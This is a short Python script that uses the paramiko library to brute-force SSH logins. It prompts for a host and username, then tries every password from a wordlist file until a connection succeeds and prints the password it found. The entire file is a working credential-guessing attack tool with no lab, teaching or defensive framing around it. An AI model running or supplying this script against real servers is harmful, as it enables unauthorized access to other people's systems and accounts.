import paramiko

host = input("Host: ")
user = input("Username: ")
with open("wordlist.txt", "r") as file:
    for password in file:
        password = password.strip()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=password)
            print(f"[+] Password found: {password}")
            break
        except:
            print(f"[-] Failed: {password}")
